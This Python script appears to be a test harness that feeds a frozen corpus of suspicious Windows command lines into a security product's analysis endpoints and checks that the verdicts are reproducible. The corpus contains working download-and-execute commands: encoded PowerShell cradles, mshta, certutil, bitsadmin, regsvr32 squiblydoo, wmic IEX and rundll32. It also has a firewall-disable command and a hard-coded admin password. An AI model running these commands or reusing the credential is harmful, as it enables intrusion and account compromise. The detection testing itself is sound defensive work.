#!/usr/bin/env python3
"""Real Investigation Proof · Phase-A harness (read-only against LIVE product).

Non-mutating: exercises the SAME `/api/upload` path a human analyst uses.
No product code path is stubbed, mocked, or bypassed.

Outputs a JSON matrix to `/app/memory/experiments/rip/results.json` that
the report (ADR-0010e) is built from.

Corpus is FROZEN at `/app/memory/experiments/rip/corpus.md`. This driver
only reads it — it does not curate.
"""
from __future__ import annotations
import hashlib
import io
import json
import os
import re
import sys
import time
from pathlib import Path

import requests

API = os.environ.get("REACT_APP_BACKEND_URL") or open("/app/frontend/.env").read()
API = re.search(r"REACT_APP_BACKEND_URL\s*=\s*\"?([^\"\n]+)\"?", API).group(1)

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"

# Frozen corpus — payloads copied verbatim from corpus.md (which was
# frozen BEFORE this run).
CORPUS = [
    ("rip-01-ps-enc-launcher",
     b"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"),
    ("rip-02-mshta-remote-hta",
     b"mshta.exe http://198.51.100.23/dropper.hta"),
    ("rip-03-certutil-urlcache",
     b"certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"),
    ("rip-04-squiblydoo",
     b"regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"),
    ("rip-05-wmic-process",
     b"wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""),
    ("rip-06-benign-recon-ps",
     b"Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"),
    ("rip-07-netsh-fw-off",
     b"netsh advfirewall set allprofiles state off"),
    ("rip-08-nested-b64-ps",
     b"powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""),
    ("rip-09-too-short", b"dir"),
    ("rip-10-empty-input", b""),
    ("rip-11-bitsadmin-transfer",
     b"bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"),
    ("rip-12-rundll32-poweliks",
     b"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"),
]


def login() -> str:
    r = requests.post(f"{API}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
                      timeout=15)
    r.raise_for_status()
    return r.json()["access_token"]


def upload(token: str, name: str, payload: bytes) -> dict:
    """Push the payload through the LIVE /api/upload path exactly as the
    Workspace UI does. Returns the parsed JSON body + timing."""
    t0 = time.perf_counter()
    r = requests.post(
        f"{API}/api/upload",
        headers={"Authorization": f"Bearer {token}"},
        files={"file": (f"{name}.txt", io.BytesIO(payload), "text/plain")},
        timeout=120,
    )
    dt_ms = (time.perf_counter() - t0) * 1000
    try:
        body = r.json()
    except Exception:  # noqa: BLE001
        body = {"non_json_response": r.text[:2000]}
    return {"status": r.status_code, "elapsed_ms": round(dt_ms, 1),
            "body": body}


def die_analyze(token: str, upload_body: dict) -> dict:
    """Trigger the LIVE DIE (Deterministic Investigation Engine) on the
    content the Workspace received. This is what the UI does next after
    the upload response arrives.
    """
    content = upload_body.get("content") or upload_body.get("text") or ""
    if not content:
        return {"status": "skipped_empty_content", "body": None}
    t0 = time.perf_counter()
    r = requests.post(
        f"{API}/api/die/analyze",
        headers={"Content-Type": "application/json"},
        json={"input": content},
        timeout=180,
    )
    dt_ms = (time.perf_counter() - t0) * 1000
    try:
        body = r.json()
    except Exception:  # noqa: BLE001
        body = {"non_json_response": r.text[:2000]}
    return {"status": r.status_code, "elapsed_ms": round(dt_ms, 1),
            "body": body}


def analyze_classic(token: str, content: str) -> dict:
    """Call /api/analyze — the LIVE analyst-facing verdict endpoint
    (risk score + verdict label + MITRE + IOCs + LOLBAS)."""
    if not content:
        return {"status": "skipped_empty_content", "body": None}
    t0 = time.perf_counter()
    r = requests.post(
        f"{API}/api/analyze",
        headers={"Authorization": f"Bearer {token}",
                 "Content-Type": "application/json"},
        json={"input": content, "enrich_osint": False,
              "use_ai_verdict": False, "describe": False},
        timeout=120,
    )
    dt_ms = (time.perf_counter() - t0) * 1000
    try:
        body = r.json()
    except Exception:  # noqa: BLE001
        body = {"non_json_response": r.text[:2000]}
    return {"status": r.status_code, "elapsed_ms": round(dt_ms, 1),
            "body": body}


def _verdict_snapshot(analyze_body: dict) -> dict:
    """Reduce `/api/analyze` to the stable verdict signals (risk score
    bucket + verdict label + MITRE ids + IOC counts + LOLBAS ids)."""
    if not isinstance(analyze_body, dict):
        return {"kind": type(analyze_body).__name__}
    risk = analyze_body.get("risk") or {}
    mitre = analyze_body.get("mitre") or []
    iocs = analyze_body.get("iocs") or {}
    lolbas = analyze_body.get("lolbas") or []
    mitre_ids = sorted({str(m.get("id", "")).upper()
                        for m in mitre if isinstance(m, dict) and m.get("id")})
    lolbas_bins = sorted({str(l.get("binary", "")).lower()
                          for l in lolbas if isinstance(l, dict)})
    ioc_counts = {}
    if isinstance(iocs, dict):
        for k, v in iocs.items():
            if isinstance(v, list):
                ioc_counts[k] = len(v)
    return {
        "verdict_label":      risk.get("verdict"),
        "risk_score_bucket":  (round(int(risk.get("score", 0)) / 10) * 10),
        "risk_level":         risk.get("level"),
        "mitre_ids":          mitre_ids,
        "lolbas_bins":        lolbas_bins,
        "ioc_counts":         ioc_counts,
    }


def die_narrate(content: str) -> dict:
    """Call /api/die/narrate — the deterministic analyst-facing summary
    the Workspace renders. Zero LLM."""
    if not content:
        return {"status": "skipped_empty_content", "body": None}
    t0 = time.perf_counter()
    r = requests.post(
        f"{API}/api/die/narrate",
        headers={"Content-Type": "application/json"},
        json={"input": content},
        timeout=120,
    )
    dt_ms = (time.perf_counter() - t0) * 1000
    try:
        body = r.json()
    except Exception:  # noqa: BLE001
        body = {"non_json_response": r.text[:2000]}
    return {"status": r.status_code, "elapsed_ms": round(dt_ms, 1),
            "body": body}


def _snapshot_for_diff(die_body: dict) -> dict:
    """Reduce a DIE response to the stable analytical signals.

    DIE's real response shape (verified 2026-08-11):
      result.techniques[{id, name, evidence}]
      result.lolbins[{binary, category, mitre[], trust}]
      result.iocs[{kind, value, confidence, source}]
      result.attack_intent{mitre[], confidence, objective,
                           observed_phases[], missing_phases[]}
      result.language, result.obfuscation_score
    """
    if not isinstance(die_body, dict):
        return {"kind": type(die_body).__name__}
    r = die_body.get("result") if isinstance(die_body.get("result"), dict) else die_body
    techs = r.get("techniques") or []
    lolbins = r.get("lolbins") or []
    iocs = r.get("iocs") or []
    intent = r.get("attack_intent") or {}

    tech_ids = sorted({str(t.get("id", "")).upper() for t in techs if isinstance(t, dict)})
    lolbin_ids = sorted({str(l.get("binary", "")).lower() for l in lolbins if isinstance(l, dict)})
    lolbin_mitre = sorted({tid.upper() for l in lolbins if isinstance(l, dict)
                           for tid in (l.get("mitre") or [])})
    intent_mitre = sorted({str(m).upper() for m in (intent.get("mitre") or [])})
    all_mitre = sorted(set(tech_ids) | set(lolbin_mitre) | set(intent_mitre))
    iocs_by_kind = {}
    for i in iocs:
        if isinstance(i, dict):
            iocs_by_kind.setdefault(i.get("kind", "?"), []).append(i.get("value"))
    return {
        "language": r.get("language"),
        "obfuscation_score": r.get("obfuscation_score"),
        "mitre_ids": all_mitre,
        "mitre_from_techniques": tech_ids,
        "mitre_from_lolbins": lolbin_mitre,
        "mitre_from_intent": intent_mitre,
        "lolbins": lolbin_ids,
        "ioc_kinds": sorted(iocs_by_kind.keys()),
        "ioc_count": sum(len(v) for v in iocs_by_kind.values()),
        "intent_objective": intent.get("objective"),
        "intent_confidence_bucket": (
            round(float(intent.get("confidence") or 0) * 10) / 10),
        "intent_phases_observed": sorted(intent.get("observed_phases") or []),
        "evidence_count": sum(1 for t in techs
                              if isinstance(t, dict) and t.get("evidence")),
    }


def run() -> None:
    token = login()
    results = {"api": API, "corpus_hash": hashlib.sha256(
        b"|".join(name.encode() + b"\x00" + p for name, p in CORPUS)
    ).hexdigest(), "cases": []}
    for name, payload in CORPUS:
        print(f"\n=== {name} ({len(payload)} bytes) ===", flush=True)
        rec = {"case_id": name, "payload_sha256":
               hashlib.sha256(payload).hexdigest(),
               "payload_size": len(payload)}
        # Run 1
        u1 = upload(token, name, payload)
        d1 = die_analyze(token, u1["body"] if u1["status"] == 200 else {})
        n1 = die_narrate(payload.decode("utf-8", errors="replace"))
        a1 = analyze_classic(token, payload.decode("utf-8", errors="replace"))
        # Run 2 (reproducibility)
        u2 = upload(token, name, payload)
        d2 = die_analyze(token, u2["body"] if u2["status"] == 200 else {})
        n2 = die_narrate(payload.decode("utf-8", errors="replace"))
        a2 = analyze_classic(token, payload.decode("utf-8", errors="replace"))
        rec["run1"] = {"upload": u1, "die": d1, "narrate": n1, "analyze": a1}
        rec["run2"] = {"upload": u2, "die": d2, "narrate": n2, "analyze": a2}
        rec["reproducibility"] = {
            "upload_dedup_flipped": (
                u1["body"].get("dedup") is False and
                u2["body"].get("dedup") is True
            ) if u1["status"] == 200 and u2["status"] == 200 else None,
            "die_stable": _snapshot_for_diff(d1.get("body") or {}) ==
                          _snapshot_for_diff(d2.get("body") or {}),
            "analyze_stable": _verdict_snapshot(a1.get("body") or {}) ==
                              _verdict_snapshot(a2.get("body") or {}),
            "run1_snapshot": _snapshot_for_diff(d1.get("body") or {}),
            "run2_snapshot": _snapshot_for_diff(d2.get("body") or {}),
            "run1_verdict":  _verdict_snapshot(a1.get("body") or {}),
            "run2_verdict":  _verdict_snapshot(a2.get("body") or {}),
        }
        results["cases"].append(rec)
        # Line-summary print for live progress.
        s = rec["reproducibility"]["run1_snapshot"]
        v = rec["reproducibility"]["run1_verdict"]
        print(f"  verdict={v.get('verdict_label')}({v.get('risk_score_bucket')}) "
              f"lang={s.get('language')} "
              f"mitre={s.get('mitre_ids')} "
              f"lolbins={s.get('lolbins')} "
              f"iocs={s.get('ioc_count')} "
              f"stable_die={rec['reproducibility']['die_stable']} "
              f"stable_analyze={rec['reproducibility']['analyze_stable']}")
    out = Path("/app/memory/experiments/rip/results.json")
    out.write_text(json.dumps(results, indent=2, sort_keys=True))
    print(f"\nWROTE {out}", flush=True)


if __name__ == "__main__":
    run()
